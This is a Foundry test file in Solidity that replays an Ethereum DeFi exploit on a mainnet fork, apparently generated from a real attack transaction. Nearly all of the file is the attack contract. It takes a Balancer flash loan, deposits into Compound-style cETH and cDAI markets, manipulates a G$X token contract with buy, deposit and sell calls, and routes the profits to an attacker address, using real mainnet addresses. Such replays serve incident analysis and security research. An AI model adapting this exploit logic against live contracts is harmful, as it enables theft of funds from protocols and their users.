
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 18802014;
    uint256 constant TX_TIMESTAMP = 1702770839;
    uint256 constant TX_BLOCK_NUMBER = 18802015;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_contract, attack, Addresses.G_X, "G$X", 1021339424425);
    }
}

contract OurAttack {




    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(6)),
                bytes32(uint256(70927591571339142863007940070472750828349950554))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(10)),
                bytes32(uint256(881254460654942521580003350280803335759147674230))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(4)),
                bytes32(uint256(920946221454996813547044107439146533588255176416))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(5)),
                bytes32(uint256(592431060199377517065870883287334982788564519243))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1097077688018008265106216665536940668749033598146))
            );
        IERC20Like(Addresses.WETH).balanceOf(Addresses.Vault_BA1222);
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(11)), bytes32(uint256(5090998266365)));
        {
            _recordBalancerFlash(_addressArray1(Addresses.WETH));
            if (address(this) != address(this)) {
                (bool ok,) = address(this)
                    .call(
                        abi.encodeWithSignature(
                            "recordBalancerFlashLoanPreBalances(address[])", _addressArray1(Addresses.WETH)
                        )
                    );
                ok;
            }
            IVault_BA1222(Addresses.Vault_BA1222)
                .flashLoan(
                    address(this), _addressArray1(Addresses.WETH), _uintArray1(55376480679052499243410), hex""
                );
        }
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76).owner();
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.A_6C08F5_161B, wethBalanceOfAttackAttackContract);
    }

    function flashCallback() internal {
        _markCallback(1);
        uint256 withdrawAvailableAmount = IERC20Like(Addresses.WETH).balanceOf(address(this));
        if (withdrawAvailableAmount > 39000000000000000000000) withdrawAvailableAmount = 39000000000000000000000;
        IWETH(Addresses.WETH).withdraw(withdrawAvailableAmount);
        IERC20Like(Addresses.WETH).approve(Addresses.cETH, type(uint256).max);
        IcETH(Addresses.cETH).mint{value: 39000000000000000000000}();
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray1(Addresses.cETH));
        uint256 cDAIGetCashReturn = IcDAI(Addresses.cDAI).getCash();
        IcDAI(Addresses.cDAI).borrow(cDAIGetCashReturn);
        IERC20Like(Addresses.DAI).approve(Addresses.cDAI, type(uint256).max);
        uint256 daiBalanceOfAttackAttackContract = IERC20Like(Addresses.DAI).balanceOf(address(this));
        IcDAI(Addresses.cDAI).mint(daiBalanceOfAttackAttackContract);
        IERC20Like(Addresses.cDAI).approve(Addresses.G_X, type(uint256).max);
        IERC20Like(Addresses.cDAI).balanceOf(address(this));
        IG_X(Addresses.G_X).buy(228488816255120718, 1, address(this));
        uint256 cDAIBalanceOfAttackAttackContract = IERC20Like(Addresses.cDAI).balanceOf(address(this));
        IERC20Like(Addresses.cDAI).transfer(Addresses.A_9A5CD1_AA76, cDAIBalanceOfAttackAttackContract);
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76)
            .deposit(Addresses.ERC1967Proxy, Addresses.G, Addresses.G_X);
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76)
            .deposit(Addresses.ERC1967Proxy, Addresses.G, Addresses.G_X);
        uint256 cDAIBalanceOfA9a5cd1Aa76 = IERC20Like(Addresses.cDAI).balanceOf(Addresses.A_9A5CD1_AA76);
        {
            uint256 transferFromAmount = cDAIBalanceOfA9a5cd1Aa76;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.A_9A5CD1_AA76);
                IERC20Like(Addresses.cDAI).transfer(address(this), transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        IERC20Like(Addresses.G).balanceOf(address(this));
        IERC20Like(Addresses.cDAI).balanceOf(Addresses.G_X);
        IERC20Like(Addresses.G).approve(Addresses.G_X, type(uint256).max);
        IG_X(Addresses.G_X).sell(5090998266365, 1, address(this), address(this));
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76).owner();
        uint256 gBalanceOfAttackAttackContract = IERC20Like(Addresses.G).balanceOf(address(this));
        IERC20Like(Addresses.G).transfer(Addresses.A_6C08F5_161B, gBalanceOfAttackAttackContract);
        IcDAI(Addresses.cDAI).redeemUnderlying(cDAIGetCashReturn);
        IcDAI(Addresses.cDAI).repayBorrow(cDAIGetCashReturn);
        uint256 cDAIBalanceOfAttackAttackContract_2 = IERC20Like(Addresses.cDAI).balanceOf(address(this));
        IcDAI(Addresses.cDAI).redeem(cDAIBalanceOfAttackAttackContract_2);
        uint256 cETHBalanceOfAttackAttackContract = IERC20Like(Addresses.cETH).balanceOf(address(this));
        IcETH(Addresses.cETH).redeem(cETHBalanceOfAttackAttackContract);
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76).owner();
        uint256 daiBalanceOfAttackAttackContract_2 = IERC20Like(Addresses.DAI).balanceOf(address(this));
        IERC20Like(Addresses.DAI).transfer(Addresses.A_6C08F5_161B, daiBalanceOfAttackAttackContract_2);
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 38999999999999949750305) depositAmount = 38999999999999949750305;
            if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        }
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IContract_9A5CD1_AA76(Addresses.A_9A5CD1_AA76).owner();
        uint256 wethTransferFromAmount = 123000000000000000;
        {
            uint256 transferFromAmount = wethTransferFromAmount;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.A_6C08F5_161B);
                IERC20Like(Addresses.WETH).transfer(address(this), transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        uint256 transferActionGraphAmount = 55376480679052499243410;
        IERC20Like(Addresses.WETH).transfer(Addresses.Vault_BA1222, transferActionGraphAmount);
    }

    function _attack2() internal {
        _markCallback(2);
    }

    receive() external payable {}

    function receiveFlashLoan(
        address[] calldata arg0,
        uint256[] calldata arg1,
        uint256[] calldata arg2,
        bytes calldata arg3
    ) external payable {
        arg0;
        arg1;
        arg2;
        arg3;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x2ebd2116) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ERC1967Proxy = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;
    address internal constant AxelarGasServiceProxy = 0x2d5d7d31F671F86C782533cc367F14109a082712;
    address internal constant CErc20Delegate = 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376;
    address internal constant Unitroller = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address internal constant A_437C69_005D = 0x437C699887779D0A95aD6349CFDE7DFA716C005D;
    address internal constant A_43D72F_A4A1 = 0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1;
    address internal constant cETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address internal constant AxelarGatewayProxyMultisig = 0x4F4495243837681061C4743b74B3eEdf548D56A5;
    address internal constant AxelarGasService = 0x4Fe2d119873790cc9e15F6cC53cae1C2eb2039dC;
    address internal constant cDAI = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address internal constant EternalStorageProxy = 0x63C47c296B63bE888e9af376bd927C835014039f;
    address internal constant attacker_eoa = 0x6738fA889fF31F82d9Fe8862ec025dbE318f3Fde;
    address internal constant G = 0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant A_6C08F5_161B = 0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B;
    address internal constant BridgeHelperLibrary = 0x7ab6E3B49769c330caE585c6C3d298F327769920;
    address internal constant A_9A5CD1_AA76 = 0x9A5cD1145791B29Ac4E68dF3Bf8E30d2167daA76;
    address internal constant G_X = 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0;
    address internal constant ERC1967Proxy_F4A5 = 0xa3247276DbCC76Dd7705273f766eB3E8a5ecF4a5;
    address internal constant ERC1967Proxy_2FD0 = 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant EternalStorageProxy_CCB0 = 0xD5D11eE582c8931F336fbcd135e98CEE4DB8CCB0;
    address internal constant ERC1967Proxy_659F = 0xDAC6A0c973Ba7cF3526dE456aFfA43AB421f659F;
    address internal constant attack_contract = 0xF06Ab383528F51dA67E2b2407327731770156ED6;
    address internal constant A_F19FB9_CD33 = 0xF19fB90fA4DDb67C330B41AD4D64ef75B9d8Cd33;
}

interface IContract_9A5CD1_AA76 {
    function deposit(address, address, address) external;
    function owner() external view returns (uint256);
}

interface IG_X {
    function buy(uint256, uint256, address) external returns (uint256);
    function sell(uint256, uint256, address, address) external;
    function buy() external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external;
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IcDAI {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256) external returns (uint256);
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IcETH {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
